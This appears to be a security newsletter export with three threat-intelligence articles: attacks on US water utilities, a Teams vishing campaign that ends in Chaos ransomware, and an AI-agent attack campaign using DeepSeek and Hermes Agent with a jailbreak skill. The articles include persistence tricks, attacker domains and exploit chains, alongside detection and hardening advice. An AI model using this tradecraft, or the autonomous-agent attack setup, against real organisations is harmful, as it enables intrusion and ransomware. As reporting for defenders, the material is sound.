The downstream damage depended on the role of the hijacked device — sensor or actuator — and on whether the utility could fall back to manual control [1]. Where pressure collapsed, a quieter danger opened: sustained low pressure can let untreated groundwater seep into distribution pipes — the mechanism behind the contamination fear in the leaked Minnesota Bureau of Criminal Apprehension memo [4].

Minnesota: what a good response looks like at 6 AM

The Braham case (population ~1,700) deserves to become a training slide. A plant operator noticed that "the water tower was calling for water, but the well was not operating." Staff confirmed similar failures in at least four other communities, isolated the affected system, restored from backup, and restarted the plant in roughly 90 minutes — while the city's water tower bridged the supply gap [8][10]. Maple Plain declared a local state of emergency and ran crewed restorations; Plymouth and South St. Paul shifted to manual operations [10].

Minnesota's CISO John Israel credited "whole-of-government" coordination — state, federal, tribal, local and private partners working one incident — for the limited damage [2][8]. He also warned early that the same threat activity "has likely been occurring in other states," which the FBI's seven-state tally then confirmed [4][8].

Attribution: an honest status report

The picture as of August 1 [5][6][7][11]:

  • The New York Times reported that US and state officials briefed on the investigation concluded the Minnesota attacks were "likely" carried out by Iranian state-sponsored hackers — citing tradecraft and, revealingly, the absence of ransom demands. All parties called the assessment preliminary.
  • Tenable assessed the operational pattern as consistent with CyberAv3ngers, an IRGC-affiliated group — the same actor behind the November 2023 compromises of Israeli-made Unitronics controllers at US water utilities.
  • A leaked WaterISAC memo (obtained by WIRED) states the Minnesota Fusion Center assessed the activity as "aligned" with the Iran-affiliated PLC campaign that CISA had already flagged in April — an advisory pointedly updated on July 22, days before the strikes.
  • Officially: no formal attribution, and investigators are explicitly wary of false flags. The political noise around it — including the President publicly disputing the assessment — changes nothing about the forensics and deserves no amplification.

Context that isn't speculative: amid the ongoing US–Iran conflict, CNN reported in April that Iran-linked hackers had already disrupted multiple US oil, gas and water sites [4]. Whoever pulled this off knew the quiet infrastructure and chose it deliberately.

Why water is the softest target in critical infrastructure

The industry's structural debt made this attack cheap to run [4][9]:

  • Internet-facing devices by default. Remote access arrived as a convenience feature for under-staffed utilities; nobody priced in that it also serves adversaries. Joshua Corman's line this week: "Water systems have enjoyed the benefits of remote access — now those who wish us harm have it, too."
  • Default credentials and undocumented modems. CISA's guidance explicitly warns operators to hunt for cellular modems installed by vendors or integrators that never made it into any inventory [9].
  • End-of-life equipment. Devices that no longer receive security updates are preferentially targeted [1].
  • Funding and staffing gaps. The sector has struggled for years; industry specialists like Gus Serino noted that the response succeeded on the water sector's inherent resilience, not on its cybersecurity architecture [4].
  • Blast radius unlike any other sector. Joe Slowik (former Los Alamos) highlighted the novelty: "documented disruption and modification of safety and protection parameters" across multiple civilian sites — tradecraft rarely seen outside Russia's campaigns against Ukraine [7].

The historical line is unbroken: ZuCaNo ransomware forcing manual operations at a Maine utility (2021), the Ghost strain sitting a month undetected in California (2021), CyberAv3ngers at Aliquippa (2023) — same open doors, larger ambitions each round [1].

The fix: unglamorous, affordable, overdue

The combined FBI/EPA/CISA guidance issued July 30 is a checklist, not a research program [1][9]:

  1. Disconnect PLCs and control devices from the public internet. Remote access only through a secure gateway or jump host/VPN.
  2. Credentials: long, unique passwords — never factory defaults.
  3. Allow-list which machines may communicate with control devices.
  4. Inventory external connections, including undocumented cellular modems.
  5. Key switches in "run" position to block unauthorized program changes; review control logic for tampering before restoring it.
  6. Practice manual operation — Braham proved why: resilience lives in trained crews and water-tower buffers.
  7. Replace end-of-life equipment.

Where to report: local FBI field office and ic3.gov; CISA's 24/7 line 1-844-SAY-CISA (1-844-729-2472); Rockwell Automation PSIRT for device questions [1].

For everyone who doesn't run a utility: the useful citizen actions are modest — ask your municipality whether its utility follows this guidance, and don't amplify contamination rumors ahead of confirmations.

The takeaway

Every post in this series has been about trust in invisible machinery — AI links, AI documents, AI agents, a friendly voice on Teams, and now a pump that obeys whoever holds the password. America's water plants didn't get out-hacked this week; they got out-defaulted. The adversary used no zero-day because none was needed.

The strategic sentence belongs to Corman: "If we can't protect it, should we disconnect it?" — invert it, and you have the entire security program for the next decade:

Disconnect what you can't defend. Defend what you can't disconnect.

  3. WIRED — A Leaked Memo Ties Cyberattacks on Minnesota Water Utilities to Iran (WaterISAC/Fusion Center memo details; Tenable's CyberAv3ngers pattern match; Slowik quotes; CISA April advisory updated July 22), July 30, 2026. https://www.wired.com/story/a-leaked-memo-ties-cyberattacks-on-minnesota-water-utilities-to-iran/

  8. FOX News Digital — additional detail via [5]; Braham mayor Nate George account ("water tower was calling for water, but the well was not operating"; ~90-minute isolation, backup restore, restart; 36 systems per Israel).
  9. Ogun Security — Cyberattack on America's Water: Hackers Strike Utilities in Seven States (sector soft-target analysis), July 31, 2026. https://www.ogunsecurity.com/post/cyberattack-on-america-s-water-hackers-strike-utilities-in-seven-states

articles.title: The Two-Minute Call That Encrypts Your Network: Inside STAC4749's Teams Vishing Playbook
articles.subtitle: Sophos tracked a ransomware crew that opens Microsoft Teams, plays "IT support" for 120 seconds, and walks away with the keys to your network — reaching full encryption in under 17 hours. No exploit required.
articles.summary: Between February and June 2026, a financially motivated intrusion set tracked by Sophos as STAC4749 targeted dozens of organizations across North America with a disarmingly simple playbook: call employees on Microsoft Teams while posing as internal IT support, talk them into opening a legitimate remote-support tool — most often Microsoft's built-in Quick Assist — and use the resulting foothold to move through the network, culminating in Chaos ransomware [1][2].

toc.title: The cast: a professional operation, not a script kiddie
The two minutes: how the call actually works
The seventeen hours: from remote session to encrypted network
Why every existing defense watched it happen

articles.bodyHtml:
Summary

Between February and June 2026, a financially motivated intrusion set tracked by Sophos as STAC4749 targeted dozens of organizations across North America with a disarmingly simple playbook: call employees on Microsoft Teams while posing as internal IT support, talk them into opening a legitimate remote-support tool — most often Microsoft's built-in Quick Assist — and use the resulting foothold to move through the network, culminating in Chaos ransomware [1][2].

Two numbers define the campaign. The fraudulent calls averaged two to two-and-a-half minutes — short enough to feel like routine IT hygiene [1][4]. And in the fastest confirmed case, the time from that first friendly ring to enterprise-wide encryption was under 17 hours [1][4]. At least three intrusions ended in Chaos deployment, with ransom notes dropped as readme.chaos.txt and endpoints encrypted nearly simultaneously [1][3].

There was no software vulnerability at the core of any of this. The engine is trust — and the realization that companies spent years filtering email while quietly turning their collaboration platform into an unguarded front door [1][6].

The cast: a professional operation, not a script kiddie

Sophos' telemetry paints a focused picture. Roughly 95% of observed incidents hit organizations in Canada (~50%) and the United States [5]. The operators worked from a rotating infrastructure of IT-themed .top domains — many of them deliberately near-correct misspellings like sequrityupdate[.]top, scansequrity[.]top or supportsoft[.]top — registering accounts under warm, plausible employee personas such as "Anthony Brooks" or "Ella Harper" [1][3][6].

The tooling evolved while the campaign ran, which is why defenders kept describing a moving target [1][2]:

  • Early phase: a custom loader with hard-coded command-and-control addresses, dropped via PowerShell in the remote session.
  • Middle phase: a PyInstaller/PyArmor-based Python backdoor delivered directly through the remote session — cutting steps and shrinking the signature footprint. The backdoor fetched its AES key from a public GitHub repository, decrypted its configuration and beaconed to Cloudflare-fronted payload domains [3].
  • Parallel implants: Go-based payloads launched with --token-raw arguments and pinned certificate authorities tied to specific C2 servers [3].

One sourcing caveat worth stating plainly: the STAC4749 designation and its linkage to Chaos RaaS currently trace back to Sophos' report as the primary source [4]. The technical artifacts and IoCs below are consistent across that report and independent write-ups [1][2][3].

The two minutes: how the call actually works

The vishing pattern is engineered for plausibility, not sophistication [1][2][6]:

  1. Contact. An external Teams chat or voice call arrives from an IT-themed account. The caller knows the victim's name and often has context that sounds internal.
  2. The premise. A routine, low-alarm story: malware flagged on the workstation, a security scan, a compliance cleanup.
  3. The ask. "Open Quick Assist so I can take a look." If Quick Assist is unavailable, the caller pivots to an alternative — RemSupp, later also AnyDesk or DWAgent [1][7]. All are legitimate, digitally signed remote-administration tools.
  4. The clock. Observed calls ranged from 90 seconds to over 20 minutes, clustering at two to two-and-a-half minutes [1][4]. Short, calm and friendly is the whole trick: nothing about the interaction feels like an emergency worth reporting.

The strategic cunning is living off the land. Endpoint protection is built to stop unknown binaries; it is not built to stop a Microsoft-signed support utility that an employee launched voluntarily [6][7].

The seventeen hours: from remote session to encrypted network

Once the session is approved, the operators work fast and quietly [1][2][3]:

  • Recon. Commands profile the machine and, crucially, enumerate the security products running on it.
  • Persistence. Registry Run keys masquerading as "Realtek HD Audio" / "WinAudio" services; Startup-folder shortcuts disguised as "SecurityHealth" and "OneDriveUpdate", created via mklink scripts. Filenames rotate (helper<random>.exe, msupdate.exe, path1.exe) to defeat simple signatures.
  • Lateral movement. RDP is enabled on the compromised workstation to reach neighboring machines; a reverse SOCKS proxy (c5.exe, infrastructure egio[.]name) provides secondary access tunnels.
  • The payload. In at least three intrusions, this ended with Chaos ransomware — a ransomware-as-a-service operation active since at least February 2025 — encrypting endpoints nearly simultaneously and dropping readme.chaos.txt [1][3].

The stage table below is the one to share with your team — it maps what the victim experiences against what is actually happening.

Why every existing defense watched it happen

The campaign is a case study in defeating the security stack by route selection [1][6][7]:

  • Email filters: never engaged — there is no email.
  • Link protection and sandboxes: bypassed — the payload channel is an approved remote session.
  • EDR signature logic: diluted — rotating filenames, PyArmor packing, legitimate admin tools doing their documented job.
  • User training: aimed at the wrong door — employees were drilled to distrust messages, not a calm voice on the company's own collaboration platform.

The uncomfortable summary: attackers didn't break the security model. They walked around it, through the one entrance labeled "trusted by design."

The defense playbook

Recommendations synthesized from Sophos and the incident reporting [1][2][4]:

For every employee (the actual perimeter):

  • Any external Teams contact claiming to be IT and requesting Quick Assist, AnyDesk or similar: end the call, then verify — via the internal helpdesk number from your intranet, never a number the caller provides.
  • Internalize the pattern: authority + mild urgency + a "2-minute favor" is the signature. Your speed of hanging up is a security control.
  • Report every odd call, even the ones you hung up on. The enterprise-wide encryption window is measured in hours; early reports are what make takedown of persistence possible before the payload lands.

For admins and security teams:

  • Restrict remote-support tooling by policy. Block or gate unapproved RMM executables (AppLocker/WDAC or equivalent); if the business doesn't use Quick Assist, disable it. An allowlist here would have ended most of this campaign in stage two.
  • Tighten Teams federation. External chats and calls should be limited to known tenants; review who can reach your users from arbitrary .top domains.
  • Hunt the two-minute signature. Detection logic worth copying: PowerShell or command-line execution shortly after a remote-support tool launches (Quick Assist, RemSupp, AnyDesk, DWAgent) [4]. Add review of Run keys and Startup entries masquerading as audio drivers (Realtek, WinAudio) or sync clients (OneDriveUpdate).
  • Watch for tunneling. Reverse SOCKS proxies and Cloudflare-fronted beaconing blend into normal traffic; egress anomaly detection earns its budget here.
  • Rehearse the 17-hour scenario. If initial access at 10 AM can mean encryption by 9 AM the next morning, your incident-response clock service-level agreements need to match that reality, not the weekly patch cycle.

The takeaway

The pattern this newsletter keeps documenting is trust being re-aimed. AI assistants taught us to distrust confident links and helpful documents. STAC4749 doesn't even need the AI — it re-arms the oldest weapon there is: a helpful human voice, arriving through a channel your organization pre-approved.

Firewalls inspect packets. Proxies inspect links. Nobody inspects politeness. That's the gap, and it has a 17-hour fuse.

Verify the caller, not the tool. Hang up, then call back — through a number you already had.

articles.title: One Telegram Message, 460 Targets: Inside the First Fully Documented AI-Run Attack Campaign
articles.subtitle: Unit 42 recovered a complete DeepSeek/Hermes Agent attack session — keystroke-free after the first command. It shows autonomous exploitation failing on basic hardening. And why that margin won't hold.
articles.summary: On July 30, 2026, Palo Alto Networks' Unit 42 published what reads like a preview of the next decade of cyber offense: a Chinese-speaking threat actor — tracked by the aliases knaithe and KnYuan — ran an integrated attack stack in which the AI model DeepSeek, embedded in the open-source Hermes Agent framework and remote-controlled via Telegram, autonomously enumerated targets, sourced public exploits and launched attacks across more than 460 targets [1][2].

toc.title: The recovered session: a heist without a heister
Why the AI lost — and why that sentence has an expiration date
The self-own: when your agent obeys too well

articles.bodyHtml:
Summary

On July 30, 2026, Palo Alto Networks' Unit 42 published what reads like a preview of the next decade of cyber offense: a Chinese-speaking threat actor — tracked by the aliases knaithe and KnYuan — ran an integrated attack stack in which the AI model DeepSeek, embedded in the open-source Hermes Agent framework and remote-controlled via Telegram, autonomously enumerated targets, sourced public exploits and launched attacks across more than 460 targets [1][2].

The most remarkable document in the report is a recovered agent session from May 7, 2026: after a single Telegram instruction, no further operator input exists. The agent failed, pivoted, re-planned and retargeted on its own [2]. Just as remarkable: the operation was only exposed because the agent itself — obeying a Telegram command — started a file server from the operator's home directory, handing defenders a complete view of a live AI offensive environment [1][5].

This article reconstructs the campaign, the scoreboard (why the autonomous tracks all failed), and the concrete defensive lessons. The strategic point, in Unit 42's own words: the significance lies in the trajectory, not the outcome. This was version 1 [2].

The anatomy of the stack

Three components, each replaceable — which is precisely the problem [2][3]:

  • The brain — DeepSeek. Served as the reasoning engine: code generation, vulnerability assessment, target selection and decision-making. Accessed directly via its native API.
  • The hands — Hermes Agent. An open-source agent framework providing terminal access, a skills system, Model Context Protocol (MCP) integrations and Telegram-based command and control.
  • The custom skills — the tradecraft. The actor extended Hermes with three red-teaming skills: godmode (LLM jailbreaking, bundled with the framework), web-terminal-exploitation (custom), and fofa-cyberspace-search (a template that drives the FOFA internet-asset search engine through the actor's own script). An MCP server added Nuclei scan generation and a DeepSeek-powered natural-language-to-FOFA query translator [2].

Around this core, the actor ran a small AI laboratory. Unit 42 found evidence of Claude Code (used only for connectivity testing and proxy validation), Codex/GPT-5.4 (unverified, logs deliberately not stored) and Qwen Code (two sessions, approval mode "yolo", configured with GLM-5, Qwen, Kimi and MiniMax) [2]. Western tools were routed through a third-party proxy to reduce traceability, with provider attribution headers disabled. The reading of Unit 42: an ongoing evaluation of the AI market for the most permissive offensive toolchain [2][3].

A detail worth its own paragraph: OpenAI confirmed that its provider-side safeguards refused requests violating policy and that its safety systems had flagged and disabled an account believed to be linked to this campaign — before Unit 42 shared its intelligence [2]. The frontier-model safety layers worked; the actor simply migrated to where the guardrails weren't.

The recovered session: a heist without a heister

The May 7 session, reconstructed by Unit 42, documents a complete autonomous attack cycle [2]:

  1. Langflow (CVE-2026-33017, CVSS 9.8). The agent downloaded a public exploit, enumerated 84 Langflow instances via FOFA and found one running the vulnerable version 1.3.4. The exploit required conditions that weren't present (no auto-login, no usable public flow identifier). The attack died there.
  2. Autonomous pivot. With no human in the loop, the agent surveyed 10 product families, scanned GitHub for trending proof-of-concept repositories, ranked candidates by attack surface and selected the workflow-automation platform n8n.
  3. The n8n chain. It assembled a two-vulnerability chain: CVE-2026-21858 (unauthenticated arbitrary file read, CVSS 10.0) plus CVE-2025-68613 (sandbox bypass to remote code execution, CVSS 9.9) [1][5].
  4. Mass reconnaissance. A FOFA query returned 25,209 n8n systems in China. The agent sampled roughly 100, probed about 40, and identified three running vulnerable versions. One exposed three form endpoints — but every single one required authentication. More than 50 further targets had no publicly accessible form at all.
  5. End of tape. The agent launched parallel scans across 50+ remaining Chinese targets, found nothing usable, and the recovered session data ends.

No operator message appears at any point. Unit 42's assessment: a functional, end-to-end autonomous offensive capability — discovery, assessment, pivot and retargeting without human intervention [2].

The campaign scoreboard

Across roughly 460 attempted targets and seven exploit tracks (eight CVEs, since the n8n track chains two), Unit 42 could confirm only three successful compromises [1][2][3]:

The three confirmed breaches all ran through Citrix NetScaler's memory-overread flaw (CVE-2026-3055), with memory data exfiltrated and actively searched for authentication cookies (NSC_AAAC=) — a clear session-hijacking pattern. The actor persistently targeted a Malaysian government entity over multiple days, refining grooming parameters and returning behind proxy anonymization [2][3]. Unit 42 also found evidence of batch exploitation against an unknown number of additional hosts — the actor deleted the list before the workspace was exposed [2].

The geographic split is telling: the autonomous tracks sprayed Chinese domestic infrastructure indiscriminately, while the manual campaign showed precision and intent [2].

Why the AI lost — and why that sentence has an expiration date

Every autonomous track failed on the same obstacle: target-side configuration [2].

  • Langflow required prerequisite settings (auto-login, a usable public flow) that weren't there.
  • n8n required publicly reachable forms; the vulnerable instances demanded authentication.

No next-gen AI defense product won this round. Boring hygiene did. And Unit 42 is explicit that this was a narrow escape, not a vindication: targets with weaker default configurations would have been susceptible [2]. The same report notes the workflow compressed hundreds of hours of manual targeting into minutes [3], that the actor is actively iterating on tooling, skills and proxy infrastructure — and that the technical barrier continues to decrease [2].

Treat "the AI hacker failed" the way you'd treat "the first dial-up virus was slow."

The self-own: when your agent obeys too well

The operation collapsed because of the same property that made it dangerous — non-interactive obedience. Responding to a routine Telegram command, Hermes Agent started an HTTP file server (python3 -m http.server 8888) from the operator's home directory /home/worker instead of an isolated staging path. The directory contained everything: AI tool configurations, exploit scripts, target lists, session logs and API keys [1][2][5].

The irony runs deeper. The human operator was demonstrably careful elsewhere: exploit directories were emptied after use, Codex response storage was disabled, Western tools ran behind anti-attribution proxies. It was the tireless assistant that leaked the office. Unit 42 draws a genuinely new lesson from this — for both sides of the law: autonomous AI execution introduces novel operational-security risks for attackers, producing forensic artifacts that would never exist under manual execution [2]. Expect defenders to start hunting for exactly this new artifact class.

Who is knaithe?

Artifact analysis and GitHub activity place the actor in Zhuhai, China, operating as an opportunistic exploit operator and self-described binary security researcher [2]. Their signature side project is 1DayNews, an automated vulnerability-intelligence pipeline that aggregates RCE disclosures from 17 sources (mostly network-perimeter vendors), uses DeepSeek to filter for exploitability, and pushes actionable alerts via Telegram [2]. In other words: the offensive stack had a defensive-looking twin — the same pipeline that informs defenders, inverted into an attacker's tasking system. Confirmed victims span three countries and multiple sectors [2].

No state attribution is made in the reporting; the profile is that of a skilled, well-tooled individual operator.

What this changes for defenders

The defensive agenda follows directly from the failure modes [1][2][5]:

Immediate (this week):

  • Patch the named stack: Langflow ≥ 1.9.0 (CVE-2026-33017); n8n ≥ 1.121.1 (earliest release covering both chained CVEs); Marimo ≥ 0.23.0 (CVE-2026-39987).
  • Audit NetScaler ADC/Gateway deployments configured as SAML identity providers against CVE-2026-3055 — the one track with confirmed exfiltration.
  • Inventory your internet-facing automation tooling (Langflow, n8n and friends). Workflow builders are becoming premier attack surfaces; FOFA already knows where yours are.

Structural:

  • Treat "no public unauthenticated endpoints" as a hard requirement, not a preference. Authentication on form endpoints is what turned a CVSS 10.0 + CVSS 9.9 chain into a no-op.
  • Alert on machine-speed reconnaissance: a single source probing dozens of hosts with fast exploit rotation is the signature of an agent, not a human. Rate-based detection now matters more than signature-based.
  • Watch outbound channels you once ignored: Telegram bots are now an approved command-and-control transport — for attackers and for defending staff automation alike.

Strategic:

  • Expect "AI offensive infrastructure" to professionalize: reusable skills, MCP integrations, proxy layers, multi-model evaluation. Threat models should stop picturing a person at a keyboard and start picturing an orchestrator supervising farmed-out agents.
  • Mine the irony: agent-driven attacks generate new artifacts (mis-scoped file servers, abandoned skill configs, API keys in session logs). Add them to threat-hunting hypotheses.

The takeaway

This series has now documented the full triangle. In phantom squatting, the AI spoke — and delivered victims to attackers. In the Word Worm, the AI read — and executed instructions nobody saw. In the DeepSeek campaign, the AI acts — choosing targets, assembling exploits and fighting through failure, all from one chat message.

Notice who the last line of defense was in all three cases. Not the model providers. Not the platform vendors. Configuration, verification and suspicion — run by humans. The human firewall isn't optional yet. Don't let it get rusty.

Unit 42 (Palo Alto Networks) — Chinese-Speaking Threat Actor Harnesses AI Models for Autonomous Cyberattacks (primary report, incl. session reconstruction, tool configuration tables, attribution, implications), July 30, 2026. https://unit42.paloaltonetworks.com/autonomous-ai-cyber-attack-campaign/
